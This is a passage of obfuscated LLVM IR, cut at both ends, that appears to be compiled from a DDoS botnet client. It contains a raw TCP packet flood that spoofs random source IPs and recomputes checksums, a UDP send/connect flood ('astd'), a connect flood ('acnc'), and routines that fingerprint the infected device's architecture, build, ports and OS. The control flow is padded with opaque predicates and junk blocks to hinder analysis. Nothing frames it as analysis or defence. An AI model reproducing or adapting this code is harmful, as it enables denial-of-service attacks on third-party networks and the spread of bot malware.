  %_45 = shl i16 %611, -257
  %_46 = shl i16 %611, -257
  %_47 = sub i16 %611, -257
  %gen48 = mul i16 %_47, -257
  %_49 = shl i16 %611, -257
  %612 = and i16 %611, -257
  %_50 = shl i16 %612, 256
  %_51 = sub i16 0, %612
  %gen52 = add i16 %_51, 256
  %_53 = sub i16 0, %612
  %gen54 = add i16 %_53, 256
  %_55 = shl i16 %612, 256
  %_56 = sub i16 %612, 256
  %gen57 = mul i16 %_56, 256
  %_58 = sub i16 0, %612
  %gen59 = add i16 %_58, 256
  %_60 = sub i16 %612, 256
  %gen61 = mul i16 %_60, 256
  %_62 = sub i16 0, %612
  %gen63 = add i16 %_62, 256
  %613 = or i16 %612, 256
  store i16 %613, i16* %610, align 4
  br label %originalBB42

originalBB67alteredBB:                            ; preds = %originalBB67, %317
  %614 = load i8*, i8** %23, align 8
  %615 = call i32 @strcmp(i8* %614, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.10, i32 0, i32 0)) #10
  %616 = icmp ne i32 %615, 0
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %347
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %366
  %617 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i32 0, i32 0)) #6
  store i8* %617, i8** %23, align 8
  br label %originalBB75

originalBB79alteredBB:                            ; preds = %originalBB79, %384
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %401
  %618 = call i32 @rand_cmwc()
  %619 = trunc i32 %618 to i16
  %620 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %621 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %620, i32 0, i32 0
  %622 = bitcast %union.anon.1* %621 to %struct.anon.2*
  %623 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %622, i32 0, i32 5
  store i16 %619, i16* %623, align 2
  %624 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %625 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %624, i32 0, i32 0
  %626 = bitcast %union.anon.1* %625 to %struct.anon.2*
  %627 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %626, i32 0, i32 6
  store i16 0, i16* %627, align 4
  %628 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %629 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %628, i32 0, i32 0
  %630 = bitcast %union.anon.1* %629 to %struct.anon.2*
  %631 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %630, i32 0, i32 7
  store i16 0, i16* %631, align 2
  %632 = load i32, i32* %9, align 4
  %633 = icmp eq i32 %632, 0
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %434
  %634 = call i32 @rand_cmwc()
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %457
  %635 = trunc i32 %458 to i16
  %636 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %637 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %636, i32 0, i32 0
  %638 = bitcast %union.anon.1* %637 to %struct.anon.2*
  %639 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %638, i32 0, i32 1
  store i16 %635, i16* %639, align 2
  %640 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %641 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %642 = call zeroext i16 @tcpcsum(%struct.iphdr* %640, %struct.tcphdr* %641)
  %643 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %644 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %643, i32 0, i32 0
  %645 = bitcast %union.anon.1* %644 to %struct.anon.2*
  %646 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %645, i32 0, i32 6
  store i16 %642, i16* %646, align 4
  %647 = bitcast i8* %105 to i16*
  %648 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %649 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %648, i32 0, i32 2
  %650 = load i16, i16* %649, align 2
  %651 = zext i16 %650 to i32
  %652 = call zeroext i16 @csum(i16* %647, i32 %651)
  %653 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %654 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %653, i32 0, i32 7
  store i16 %652, i16* %654, align 2
  %655 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %656 = load i32, i32* %10, align 4
  %_92 = sub i32 0, %655
  %gen93 = add i32 %_92, %656
  %_94 = shl i32 %655, %656
  %_95 = sub i32 0, %655
  %gen96 = add i32 %_95, %656
  %_97 = sub i32 %655, %656
  %gen98 = mul i32 %_97, %656
  %_99 = sub i32 0, %655
  %gen100 = add i32 %_99, %656
  %_101 = shl i32 %655, %656
  %657 = add nsw i32 %655, %656
  store i32 %657, i32* %24, align 4
  store i32 0, i32* %25, align 4
  br label %originalBB91

originalBB105alteredBB:                           ; preds = %originalBB105, %499
  %658 = load i32, i32* %17, align 4
  %659 = bitcast %struct.sockaddr_in* %16 to %struct.sockaddr*
  %660 = call i64 @sendto(i32 %658, i8* %105, i64 %103, i32 0, %struct.sockaddr* %659, i32 16)
  %661 = load i32, i32* %19, align 4
  %662 = call i32 @getRandomIP(i32 %661)
  %663 = call i32 @htonl(i32 %662) #9
  %664 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %665 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %664, i32 0, i32 8
  store i32 %663, i32* %665, align 4
  %666 = call i32 @rand_cmwc()
  %667 = trunc i32 %666 to i16
  %668 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %669 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %668, i32 0, i32 3
  store i16 %667, i16* %669, align 4
  %670 = call i32 @rand_cmwc()
  %671 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %672 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %671, i32 0, i32 0
  %673 = bitcast %union.anon.1* %672 to %struct.anon.2*
  %674 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %673, i32 0, i32 2
  store i32 %670, i32* %674, align 4
  %675 = call i32 @rand_cmwc()
  %676 = trunc i32 %675 to i16
  %677 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %678 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %677, i32 0, i32 0
  %679 = bitcast %union.anon.1* %678 to %struct.anon.2*
  %680 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %679, i32 0, i32 0
  store i16 %676, i16* %680, align 4
  %681 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %682 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %681, i32 0, i32 0
  %683 = bitcast %union.anon.1* %682 to %struct.anon.2*
  %684 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %683, i32 0, i32 6
  store i16 0, i16* %684, align 4
  %685 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %686 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %687 = call zeroext i16 @tcpcsum(%struct.iphdr* %685, %struct.tcphdr* %686)
  %688 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %689 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %688, i32 0, i32 0
  %690 = bitcast %union.anon.1* %689 to %struct.anon.2*
  %691 = getelementptr inbounds %struct.anon.2, %struct.anon.2* %690, i32 0, i32 6
  store i16 %687, i16* %691, align 4
  %692 = bitcast i8* %105 to i16*
  %693 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %694 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %693, i32 0, i32 2
  %695 = load i16, i16* %694, align 2
  %696 = zext i16 %695 to i32
  %697 = call zeroext i16 @csum(i16* %692, i32 %696)
  %698 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %699 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %698, i32 0, i32 7
  store i16 %697, i16* %699, align 2
  %700 = load i32, i32* %25, align 4
  %701 = load i32, i32* %15, align 4
  %702 = icmp eq i32 %700, %701
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %565
  br label %originalBB109
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8*, i8*) #5

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @astd(i8*, i32, i32) #0 {
  %4 = load i32, i32* @x.41
  %5 = load i32, i32* @y.42
  %6 = sub i32 %4, 1
  %7 = mul i32 %4, %6
  %8 = urem i32 %7, 2
  %9 = icmp eq i32 %8, 0
  %10 = icmp slt i32 %5, 10
  %11 = or i1 %9, %10
  br i1 %11, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %3
  %12 = alloca i8*, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca %struct.sockaddr_in, align 4
  %18 = alloca %struct.hostent*, align 8
  %19 = alloca i32, align 4
  %20 = alloca [5 x i8*], align 16
  store i8* %0, i8** %12, align 8
  store i32 %1, i32* %13, align 4
  store i32 %2, i32* %14, align 4
  %21 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %21, i32* %15, align 4
  %22 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %23 = sext i32 %22 to i64
  store i64 %23, i64* %16, align 8
  %24 = load i8*, i8** %12, align 8
  %25 = call %struct.hostent* @gethostbyname(i8* %24)
  store %struct.hostent* %25, %struct.hostent** %18, align 8
  %26 = bitcast %struct.sockaddr_in* %17 to i8*
  call void @llvm.memset.p0i8.i64(i8* %26, i8 0, i64 16, i32 4, i1 false)
  %27 = load %struct.hostent*, %struct.hostent** %18, align 8
  %28 = getelementptr inbounds %struct.hostent, %struct.hostent* %27, i32 0, i32 4
  %29 = load i8**, i8*** %28, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 0
  %31 = load i8*, i8** %30, align 8
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 2
  %33 = bitcast %struct.in_addr* %32 to i8*
  %34 = load %struct.hostent*, %struct.hostent** %18, align 8
  %35 = getelementptr inbounds %struct.hostent, %struct.hostent* %34, i32 0, i32 3
  %36 = load i32, i32* %35, align 4
  %37 = sext i32 %36 to i64
  call void @bcopy(i8* %31, i8* %33, i64 %37) #6
  %38 = load %struct.hostent*, %struct.hostent** %18, align 8
  %39 = getelementptr inbounds %struct.hostent, %struct.hostent* %38, i32 0, i32 2
  %40 = load i32, i32* %39, align 8
  %41 = trunc i32 %40 to i16
  %42 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 0
  store i16 %41, i16* %42, align 4
  %43 = load i32, i32* %13, align 4
  %44 = trunc i32 %43 to i16
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %17, i32 0, i32 1
  store i16 %44, i16* %45, align 2
  store i32 0, i32* %19, align 4
  %46 = load i32, i32* @x.41
  %47 = load i32, i32* @y.42
  %48 = sub i32 %46, 1
  %49 = mul i32 %46, %48
  %50 = urem i32 %49, 2
  %51 = icmp eq i32 %50, 0
  %52 = icmp slt i32 %47, 10
  %53 = or i1 %51, %52
  br i1 %53, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %54

; <label>:54:                                     ; preds = %79, %originalBBpart2
  %55 = bitcast [5 x i8*]* %20 to i8*
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 40, i32 16, i1 false)
  %56 = bitcast i8* %55 to [5 x i8*]*
  %57 = getelementptr [5 x i8*], [5 x i8*]* %56, i32 0, i32 0
  store i8* getelementptr inbounds ([159 x i8], [159 x i8]* @.str.11, i32 0, i32 0), i8** %57
  %58 = getelementptr [5 x i8*], [5 x i8*]* %56, i32 0, i32 1
  store i8* getelementptr inbounds ([356 x i8], [356 x i8]* @.str.12, i32 0, i32 0), i8** %58
  %59 = getelementptr [5 x i8*], [5 x i8*]* %56, i32 0, i32 2
  store i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.13, i32 0, i32 0), i8** %59
  %60 = getelementptr [5 x i8*], [5 x i8*]* %56, i32 0, i32 3
  store i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.14, i32 0, i32 0), i8** %60
  %61 = getelementptr [5 x i8*], [5 x i8*]* %56, i32 0, i32 4
  store i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.15, i32 0, i32 0), i8** %61
  %62 = load i32, i32* %15, align 4
  %63 = getelementptr inbounds [5 x i8*], [5 x i8*]* %20, i32 0, i32 0
  %64 = bitcast i8** %63 to i8*
  %65 = call i64 @send(i32 %62, i8* %64, i64 1460, i32 0)
  %66 = load i32, i32* %15, align 4
  %67 = bitcast %struct.sockaddr_in* %17 to %struct.sockaddr*
  %68 = call i32 @connect(i32 %66, %struct.sockaddr* %67, i32 16)
  %69 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %70 = sext i32 %69 to i64
  %71 = load i64, i64* %16, align 8
  %72 = load i32, i32* %14, align 4
  %73 = sext i32 %72 to i64
  %74 = add nsw i64 %71, %73
  %75 = icmp sge i64 %70, %74
  br i1 %75, label %76, label %79

; <label>:76:                                     ; preds = %54
  %77 = load i32, i32* %15, align 4
  %78 = call i32 @close(i32 %77)
  call void @_exit(i32 0) #11
  unreachable

; <label>:79:                                     ; preds = %54
  store i32 0, i32* %19, align 4
  %80 = load i32, i32* %19, align 4
  %81 = add i32 %80, 1
  store i32 %81, i32* %19, align 4
  br label %54
                                                  ; No predecessors!
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %3
  %83 = alloca i8*, align 8
  %84 = alloca i32, align 4
  %85 = alloca i32, align 4
  %86 = alloca i32, align 4
  %87 = alloca i64, align 8
  %88 = alloca %struct.sockaddr_in, align 4
  %89 = alloca %struct.hostent*, align 8
  %90 = alloca i32, align 4
  %91 = alloca [5 x i8*], align 16
  store i8* %0, i8** %83, align 8
  store i32 %1, i32* %84, align 4
  store i32 %2, i32* %85, align 4
  %92 = call i32 @socket(i32 2, i32 2, i32 0) #6
  store i32 %92, i32* %86, align 4
  %93 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %94 = sext i32 %93 to i64
  store i64 %94, i64* %87, align 8
  %95 = load i8*, i8** %83, align 8
  %96 = call %struct.hostent* @gethostbyname(i8* %95)
  store %struct.hostent* %96, %struct.hostent** %89, align 8
  %97 = bitcast %struct.sockaddr_in* %88 to i8*
  call void @llvm.memset.p0i8.i64(i8* %97, i8 0, i64 16, i32 4, i1 false)
  %98 = load %struct.hostent*, %struct.hostent** %89, align 8
  %99 = getelementptr inbounds %struct.hostent, %struct.hostent* %98, i32 0, i32 4
  %100 = load i8**, i8*** %99, align 8
  %101 = getelementptr inbounds i8*, i8** %100, i64 0
  %102 = load i8*, i8** %101, align 8
  %103 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 2
  %104 = bitcast %struct.in_addr* %103 to i8*
  %105 = load %struct.hostent*, %struct.hostent** %89, align 8
  %106 = getelementptr inbounds %struct.hostent, %struct.hostent* %105, i32 0, i32 3
  %107 = load i32, i32* %106, align 4
  %108 = sext i32 %107 to i64
  call void @bcopy(i8* %102, i8* %104, i64 %108) #6
  %109 = load %struct.hostent*, %struct.hostent** %89, align 8
  %110 = getelementptr inbounds %struct.hostent, %struct.hostent* %109, i32 0, i32 2
  %111 = load i32, i32* %110, align 8
  %112 = trunc i32 %111 to i16
  %113 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 0
  store i16 %112, i16* %113, align 4
  %114 = load i32, i32* %84, align 4
  %115 = trunc i32 %114 to i16
  %116 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %88, i32 0, i32 1
  store i16 %115, i16* %116, align 2
  store i32 0, i32* %90, align 4
  br label %originalBB
}

declare %struct.hostent* @gethostbyname(i8*) #2

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #3

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define void @acnc(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = add nsw i32 %10, %11
  store i32 %12, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @inet_addr(i8* %13) #6
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %16 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %15, i32 0, i32 0
  store i32 %14, i32* %16, align 4
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %17, align 4
  %18 = load i32, i32* %5, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #9
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  br label %22

; <label>:22:                                     ; preds = %26, %3
  %23 = load i32, i32* %7, align 4
  %24 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %25 = icmp sgt i32 %23, %24
  br i1 %25, label %26, label %34

; <label>:26:                                     ; preds = %22
  %27 = call i32 @socket(i32 2, i32 1, i32 0) #6
  store i32 %27, i32* %8, align 4
  %28 = load i32, i32* %8, align 4
  %29 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %30 = call i32 @connect(i32 %28, %struct.sockaddr* %29, i32 16)
  %31 = call i32 @sleep(i32 1)
  %32 = load i32, i32* %8, align 4
  %33 = call i32 @close(i32 %32)
  br label %22

; <label>:34:                                     ; preds = %22
  ret void
}

declare i32 @sleep(i32) #2

; Function Attrs: noinline nounwind uwtable
define i8* @getArch() #0 {
  %1 = load i32, i32* @x.45
  %2 = load i32, i32* @y.46
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = load i32, i32* @x.45
  %10 = load i32, i32* @y.46
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.16, i32 0, i32 0)

originalBBalteredBB:                              ; preds = %originalBB, %0
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i8* @getBuildz() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.17, i32 0, i32 0), i32 0) #6
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.18, i32 0, i32 0), i8** %1, align 8
  br label %46

; <label>:5:                                      ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0) #6
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %25

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* @x.47
  %10 = load i32, i32* @y.48
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.20, i32 0, i32 0), i8** %1, align 8
  %17 = load i32, i32* @x.47
  %18 = load i32, i32* @y.48
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %46

; <label>:25:                                     ; preds = %5
  %26 = load i32, i32* @x.47
  %27 = load i32, i32* @y.48
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  %34 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i32 0, i32 0), i32 0) #6
  %35 = icmp ne i32 %34, -1
  %36 = load i32, i32* @x.47
  %37 = load i32, i32* @y.48
  %38 = sub i32 %36, 1
  %39 = mul i32 %36, %38
  %40 = urem i32 %39, 2
  %41 = icmp eq i32 %40, 0
  %42 = icmp slt i32 %37, 10
  %43 = or i1 %41, %42
  br i1 %43, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %35, label %44, label %45

; <label>:44:                                     ; preds = %originalBBpart24
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.22, i32 0, i32 0), i8** %1, align 8
  br label %46

; <label>:45:                                     ; preds = %originalBBpart24
  store i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.23, i32 0, i32 0), i8** %1, align 8
  br label %46

; <label>:46:                                     ; preds = %45, %44, %originalBBpart2, %4
  %47 = load i8*, i8** %1, align 8
  ret i8* %47

originalBBalteredBB:                              ; preds = %originalBB, %8
  store i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.20, i32 0, i32 0), i8** %1, align 8
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %25
  %48 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i32 0, i32 0), i32 0) #6
  %49 = icmp ne i32 %48, -1
  br label %originalBB1
}

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i8* @getPortz() #0 {
  %1 = load i32, i32* @x.49
  %2 = load i32, i32* @y.50
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i8*, align 8
  %10 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.17, i32 0, i32 0), i32 0) #6
  %11 = icmp ne i32 %10, -1
  %12 = load i32, i32* @x.49
  %13 = load i32, i32* @y.50
  %14 = sub i32 %12, 1
  %15 = mul i32 %12, %14
  %16 = urem i32 %15, 2
  %17 = icmp eq i32 %16, 0
  %18 = icmp slt i32 %13, 10
  %19 = or i1 %17, %18
  br i1 %19, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %11, label %20, label %21

; <label>:20:                                     ; preds = %originalBBpart2
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i32 0, i32 0), i8** %9, align 8
  br label %62

; <label>:21:                                     ; preds = %originalBBpart2
  %22 = load i32, i32* @x.49
  %23 = load i32, i32* @y.50
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %21
  %30 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0) #6
  %31 = icmp ne i32 %30, -1
  %32 = load i32, i32* @x.49
  %33 = load i32, i32* @y.50
  %34 = sub i32 %32, 1
  %35 = mul i32 %32, %34
  %36 = urem i32 %35, 2
  %37 = icmp eq i32 %36, 0
  %38 = icmp slt i32 %33, 10
  %39 = or i1 %37, %38
  br i1 %39, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %31, label %40, label %41

; <label>:40:                                     ; preds = %originalBBpart24
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i32 0, i32 0), i8** %9, align 8
  br label %62

; <label>:41:                                     ; preds = %originalBBpart24
  %42 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.21, i32 0, i32 0), i32 0) #6
  %43 = icmp ne i32 %42, -1
  br i1 %43, label %44, label %61

; <label>:44:                                     ; preds = %41
  %45 = load i32, i32* @x.49
  %46 = load i32, i32* @y.50
  %47 = sub i32 %45, 1
  %48 = mul i32 %45, %47
  %49 = urem i32 %48, 2
  %50 = icmp eq i32 %49, 0
  %51 = icmp slt i32 %46, 10
  %52 = or i1 %50, %51
  br i1 %52, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %44
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i32 0, i32 0), i8** %9, align 8
  %53 = load i32, i32* @x.49
  %54 = load i32, i32* @y.50
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %62

; <label>:61:                                     ; preds = %41
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.24, i32 0, i32 0), i8** %9, align 8
  br label %62

; <label>:62:                                     ; preds = %61, %originalBBpart28, %40, %20
  %63 = load i8*, i8** %9, align 8
  ret i8* %63

originalBBalteredBB:                              ; preds = %originalBB, %0
  %64 = alloca i8*, align 8
  %65 = call i32 @access(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.17, i32 0, i32 0), i32 0) #6
  %66 = icmp ne i32 %65, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %21
  %67 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.19, i32 0, i32 0), i32 0) #6
  %68 = icmp ne i32 %67, -1
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %44
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.25, i32 0, i32 0), i8** %9, align 8
  br label %originalBB6
}

; Function Attrs: noinline nounwind uwtable
define i8* @getOS() #0 {
  %1 = alloca i8*, align 8
  %2 = call i32 @access(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.26, i32 0, i32 0), i32 0) #6
  %3 = icmp ne i32 %2, -1
  br i1 %3, label %4, label %5

; <label>:4:                                      ; preds = %0
  store i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.27, i32 0, i32 0), i8** %1, align 8
  br label %42

; <label>:5:                                      ; preds = %0
  %6 = call i32 @access(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.28, i32 0, i32 0), i32 0) #6
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %25

; <label>:8:                                      ; preds = %5
  %9 = load i32, i32* @x.51
  %10 = load i32, i32* @y.52
  %11 = sub i32 %9, 1
  %12 = mul i32 %9, %11
  %13 = urem i32 %12, 2
  %14 = icmp eq i32 %13, 0
  %15 = icmp slt i32 %10, 10
  %16 = or i1 %14, %15
  br i1 %16, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %8
  store i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.29, i32 0, i32 0), i8** %1, align 8
  %17 = load i32, i32* @x.51
  %18 = load i32, i32* @y.52
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %42

; <label>:25:                                     ; preds = %5
  %26 = load i32, i32* @x.51
  %27 = load i32, i32* @y.52
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %25
  store i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.30, i32 0, i32 0), i8** %1, align 8
  %34 = load i32, i32* @x.51
  %35 = load i32, i32* @y.52
